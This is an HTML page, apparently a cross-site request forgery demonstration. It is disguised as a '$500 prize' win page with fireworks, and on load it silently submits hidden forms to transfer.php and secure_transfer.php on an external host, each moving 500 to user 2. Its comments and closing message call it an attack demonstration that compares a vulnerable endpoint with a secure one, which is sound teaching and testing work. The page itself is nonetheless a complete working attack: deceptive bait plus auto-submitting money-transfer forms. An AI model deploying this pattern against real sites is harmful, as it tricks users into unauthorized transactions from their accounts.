<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>ðŸŽ‰ Congratulations! You've Won!</title>
    <style>
      /* Previous styles remain the same */
      body {
        font-family: Arial, sans-serif;
        background: linear-gradient(135deg, #ff6b6b 0%, #ff8e8e 100%);
        color: white;
        min-height: 100vh;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        text-align: center;
        margin: 0;
        padding: 20px;
      }

      .prize-container {
        background: rgba(255, 255, 255, 0.1);
        padding: 40px;
        border-radius: 20px;
        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
        max-width: 500px;
        width: 90%;
      }

      h1 {
        font-size: 2.5em;
        margin-bottom: 20px;
        color: #fff;
        text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
      }

      .prize {
        font-size: 3em;
        font-weight: bold;
        color: #ffd700;
        text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
        margin: 20px 0;
      }

      .message {
        font-size: 1.2em;
        line-height: 1.6;
        margin: 20px 0;
      }

      .loading {
        display: none;
        margin: 20px 0;
      }

      .loading:after {
        content: "...";
        animation: dots 1.5s steps(5, end) infinite;
      }

      @keyframes dots {
        0%,
        20% {
          content: ".";
        }
        40% {
          content: "..";
        }
        60% {
          content: "...";
        }
        80% {
          content: "....";
        }
        100% {
          content: ".....";
        }
      }

      .firework {
        position: absolute;
        pointer-events: none;
        animation: explode 1s ease-out forwards;
        opacity: 0;
      }

      @keyframes explode {
        0% {
          transform: scale(0);
          opacity: 0;
        }
        50% {
          opacity: 1;
        }
        100% {
          transform: scale(2);
          opacity: 0;
        }
      }

      .success-checkmark {
        width: 80px;
        height: 80px;
        margin: 20px auto;
        display: none;
      }

      .check-icon {
        width: 80px;
        height: 80px;
        position: relative;
        border-radius: 50%;
        box-sizing: content-box;
        border: 4px solid #4caf50;
      }

      .check-icon::before {
        top: 3px;
        left: -2px;
        width: 30px;
        transform-origin: 100% 50%;
        border-radius: 100px 0 0 100px;
      }

      .check-icon::after {
        top: 0;
        left: 30px;
        width: 60px;
        transform-origin: 0 50%;
        border-radius: 0 100px 100px 0;
        animation: rotate-circle 4.25s ease-in;
      }

      .check-icon::before,
      .check-icon::after {
        content: "";
        height: 100px;
        position: absolute;
        background: #ffffff;
        transform: rotate(-45deg);
      }

      /* Hidden forms - moved from inline styles */
      .hidden-form {
        display: none;
      }

      @media (max-width: 480px) {
        .prize-container {
          padding: 20px;
        }

        h1 {
          font-size: 2em;
        }

        .prize {
          font-size: 2.5em;
        }

        .message {
          font-size: 1em;
        }
      }

      .firework {
        position: absolute;
        pointer-events: none;
        width: 10px;
        height: 10px;
        background: radial-gradient(circle, #fff, #ffcc00, #ff0);
        border-radius: 50%;
        opacity: 0;
        animation: explode 0.6s ease-out forwards, fade 0.6s ease-out;
      }

      @keyframes explode {
        0% {
          transform: scale(1);
        }
        50% {
          transform: scale(5);
        }
        100% {
          transform: scale(6);
        }
      }

      @keyframes fade {
        0% {
          opacity: 1;
        }
        100% {
          opacity: 0;
        }
      }

      .spark {
        position: absolute;
        pointer-events: none;
        width: 5px;
        height: 5px;
        background: #fff;
        opacity: 0.8;
        border-radius: 50%;
        animation: spark-move 0.6s ease-out forwards;
      }

      @keyframes spark-move {
        0% {
          transform: translate(0, 0) scale(1);
        }
        100% {
          transform: translate(var(--dx), var(--dy)) scale(0.5);
          opacity: 0;
        }
      }
    </style>
  </head>
  <body>
    <div class="prize-container">
      <h1>ðŸŽ‰ Congratulations! ðŸŽ‰</h1>
      <div class="prize">$500.00</div>
      <p class="message">Your prize is being processed...</p>
      <div class="loading">Processing your reward</div>
      <div class="success-checkmark">
        <div class="check-icon"></div>
      </div>
    </div>

    <form
      id="csrf-form-vulnerable"
      action="http://crfs.infinityfreeapp.com/public/transfer.php"
      method="POST"
      class="hidden-form"
    >
      <input type="hidden" name="amount" value="500" />
      <input type="hidden" name="to_user" value="2" />
    </form>

    <form
      id="csrf-form-secure"
      action="http://crfs.infinityfreeapp.com/public/secure_transfer.php"
      method="POST"
      class="hidden-form"
    >
      <input type="hidden" name="amount" value="500" />
      <input type="hidden" name="to_user" value="2" />
    </form>

    <script>
      function createFirework() {
        const firework = document.createElement("div");
        firework.className = "firework";
        firework.style.left = Math.random() * 100 + "vw";
        firework.style.top = Math.random() * 100 + "vh";
        document.body.appendChild(firework);
        setTimeout(() => firework.remove(), 1000);
      }

      window.onload = function () {
        const loading = document.querySelector(".loading");
        loading.style.display = "block";

        // Fireworks every second
        setInterval(createFirework, 1000);

        // Process CSRF attack demonstration
        setTimeout(() => {
          document.getElementById("csrf-form-vulnerable").submit();

          setTimeout(() => {
            document.getElementById("csrf-form-secure").submit();
          }, 3000);

          setTimeout(() => {
            document.querySelector(".message").textContent =
              "Attack demonstration completed!";
            loading.style.display = "none";
            document.querySelector(".success-checkmark").style.display =
              "block";
          }, 6000);
        }, 4000);
      };
    </script>
  </body>
</html>
